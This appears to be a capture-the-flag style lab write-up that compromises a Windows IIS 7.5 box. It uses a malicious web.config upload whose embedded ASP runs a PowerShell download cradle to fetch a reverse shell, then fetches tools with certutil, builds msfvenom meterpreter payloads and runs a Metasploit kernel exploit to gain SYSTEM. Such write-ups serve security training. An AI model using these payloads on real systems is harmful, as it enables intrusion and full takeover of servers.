
## Lab Details
- Difficulty: Easy
- OS: Windows

## Summary
- Initial access: File Upload
- Privilege escalation: LPE on Outdated System

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.29.227 -sC -sV -A -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-05 22:40 EDT
Nmap scan report for 10.129.29.227
Host is up (0.0085s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
- Enumerate endpoints using `ffuf`
```
$ ffuf -u http://10.129.29.227/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt 
<SNIP>
.                       [Status: 200, Size: 630, Words: 25, Lines: 32, Duration: 17ms]
iisstart.htm            [Status: 200, Size: 630, Words: 25, Lines: 32, Duration: 6ms]
Transfer.aspx           [Status: 200, Size: 941, Words: 89, Lines: 22, Duration: 60ms]

```
- Enumerate file paths 
```
$ ffuf -u http://10.129.29.227/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.29.227/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aspnet_client           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 97ms]
uploadedfiles           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 94ms]
```

## Foothold

#### Steps
- Visit `transfer.aspx` on port 80 we are presented with a file upload page 
![[Pasted image 20260606105702.png]]
- A filter is in place unable to upload `.txt` or `.exe` 
```
$ touch test.jpg
```
- Visit the upload file we get an error message 
```
http://10.129.29.227/uploadedfiles/test.jpg
```
![[Pasted image 20260606105622.png]]
- Testing with different types of extensions and found that `.config` is not disabled 
- Search online and found that we can upload a `web.config`
-  `web.config` file is designed to overwrite the server's security settings. It instructs IIS to remove its default protections on `.config` files and, more critically, to start treating `.config` files as executable scripts (using `asp.dll`)
```
$ cat web.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
  <system.web>
    <customErrors mode="Off" />
  </system.web>
</configuration>
<%
Dim wShell, cmdLine
Set wShell = CreateObject("WScript.Shell")
cmdLine = "cmd /c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.6:8000/Invoke-PowerShellTcp.ps1')"
wShell.Run cmdLine, 0, False
Set wShell = Nothing
Response.Write("Reverse shell payload executed. Check your listener on 10.10.14.6:4444")
%>
```

- We can inject a payload to fetch and execute a reverse shell 
- The reverse shell is https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
- Upload the `web.config` and visit `http://10.129.166.200/uploadedfiles/web.config` to trigger for a RCE
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Load and run `winpeas.exe`
```
certutil -urlcache -f "http://10.10.14.6:8000/winpeas.exe" winpeas.exe
```
- **NOTE**: I would recommend creating some sacrificial reverse shells using `msfvenom` since running `winpeas.exe` will hang the session so keep the original web shell for executing sacrificial reverse shell payload
- Discovery the target is running an old windows server and has a lot of patches not installed 
```
"Microsoft Windows Server 2008 R2 Datacenter "
   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
MS04-020 patch is NOT installed 2K/SP4-POSIX)
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
```
- Create a reverse shell payload for `msfconsole` so we can run post exploit enumeration module to scan for LPE 
```
$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.6 LPORT=5555 -f exe -o stageless_reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 248902 bytes
Final size of exe file: 256000 bytes
Saved as: stageless_reverse.exe
```
- Set up the listener on `msfconsole`
```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
msf exploit(multi/handler) > set LHOST tun0
msf exploit(multi/handler) > set LPORT 5555
msf exploit(multi/handler) > run
```
- Run the payload 
```
PS C:\temp> ./stageless_reverse.exe
```
- Set up and run the `local_exploit-suggester` module
```
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set SESSION 9
SESSION => 9
msf post(multi/recon/local_exploit_suggester) > set verbose true
verbose => true
msf post(multi/recon/local_exploit_suggester) > run
```
- Below is a collection of the LPE modules that we can use to attempt to escalate privilege 
```bash
[+] 10.129.166.200 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable. Windows Server 2008 R2 appears vulnerable
[+] 10.129.166.200 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable. Target appears vulnerable
[+] 10.129.166.200 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable
[+] 10.129.166.200 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable
[+] 10.129.166.200 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.166.200 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.129.166.200 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.166.200 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
[+] 10.129.166.200 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.166.200 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.166.200 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. Target appears vulnerable
[+] 10.129.166.200 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable
[+] 10.129.166.200 - exploit/windows/persistence/registry_userinit: The target is vulnerable. Registry likely exploitable
[*] 10.129.166.200 - exploit/windows/persistence/service: The target is not exploitable. You must be System/Admin to run this Module
[+] 10.129.166.200 - exploit/windows/persistence/service_for_user/lock_unlock: The target appears to be vulnerable. Target is likely exploitable
[+] 10.129.166.200 - exploit/windows/persistence/service_for_user/logon: The target appears to be vulnerable. Target is likely exploitable
[+] 10.129.166.200 - exploit/windows/persistence/service_for_user/schedule: The target appears to be vulnerable. Target is likely exploitable
```
- I picked `cve_2019_1458_wizardopium` and able to get a shell as `nt system \ authority`
```
msf exploit(windows/local/bypassuac_sdclt) > use exploit/windows/local/cve_2019_1458_wizardopium
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/cve_2019_1458_wizardopium) > options

Module options (exploit/windows/local/cve_2019_1458_wizardopium):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     198.18.0.1       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 x64



View the full module info with the info, or info -d command.

msf exploit(windows/local/cve_2019_1458_wizardopium) > set session 9
session => 9
msf exploit(windows/local/cve_2019_1458_wizardopium) > set LHOST tun0
LHOST => 10.10.14.6
msf exploit(windows/local/cve_2019_1458_wizardopium) > set LPORT 7777
LPORT => 7777
msf exploit(windows/local/cve_2019_1458_wizardopium) > run
[*] Started reverse TCP handler on 10.10.14.6:7777
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Revision 16385 appears vulnerable
[*] Triggering the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 2736 launched.
[*] Reflectively injecting the DLL into 2736...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (248902 bytes) to 10.129.166.200
[*] Meterpreter session 13 opened (10.10.14.6:7777 -> 10.129.166.200:49200) at 2026-06-05 22:41:29 -0700


meterpreter > shell
Process 1776 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\temp>whoami
whoami
nt authority\system
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: